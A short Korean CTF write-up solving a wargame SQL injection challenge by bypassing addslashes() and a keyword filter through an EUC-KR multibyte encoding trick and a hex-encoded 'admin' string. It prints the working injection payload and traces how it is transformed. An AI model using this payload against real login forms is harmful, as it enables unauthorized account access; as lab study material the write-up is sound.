*참고* = https://rootable.tistory.com/entry/addslashes-mysqlrealescapestring-%EC%9A%B0%ED%9A%8C

id,pw값이 guest로 자동으로 들어가있어서 로그인을 해보았다.

hi guest라는 문구가 나온다. 

소스코드를 한번봐보겠다.

addslashes()함수를 통해 ",',\,null등의 문자 앞에 \를 붙여 sql에 들어갈때 일반문자로 인식시켜버린다. (sql인젝션 방지하는 함수로 사용)

admin,select,limit,pw,=,<,>가 정규표현식으로 필터링되고 있다.

select id from chall45 where id='{$_GET['id']}' and pw=md5('{$_GET['pw']}')

위의 쿼리를 우회하여 admin으로 로그인하는 것이 이번 문제의 목표이다.

pw값의 경우 md5로 해싱해주고 있기 때문에 인젝션이 불가능하다.

or,and가 사용가능하기 때문에 원래의 where 구문은 무시하는 방향으로 쿼리를 짜야 될 것 같다.

select id from chall45 where id='1' || id like 0x61646D696E#' and pw=md5('{$_GET['pw']}')

위와 같은 쿼리를 짜서 넣어보았더니 안된다... 왜그런가 확인해보니
addslashes()함수에 의해 '연산자 앞에 \이 붙어버리면서 쿼리가 내가 원하는데로 실행되지 못하는 것 같다.

근데 여기서 소스중에 mb_convert_encoding()함수를 통해 인코딩 방식을 utf-8에서 euk-kr 로 변환 시켜주고있는데 euk-kr 같은 경우 멀티바이트 형식을 사용하기 때문에 %f1이나 %aa와 같은 이스케이프 문자를 \앞에 넣어주면 두개가 합쳐져서 하나의 문자를 이루게 된다. 이 취약점을 이용해 해결하는 문제이다.

select id from chall45 where id='1%f1%27 || id like 0x61646D696E%23' and pw=md5('{$_GET['pw']}')

1%f1%27 || id like 0x61646D696E%23

1%f1\' || id like 0x61646D696E%23 <== addslashes()

1?' || id like 0x61646D696E%23  <== mb_convert_encoding()

위와 같이 쿼리를 짜보았으며 위의 쿼리를 입력했을시 입력 쿼리의 변환 과정도 표현해보았다.

클리어!!






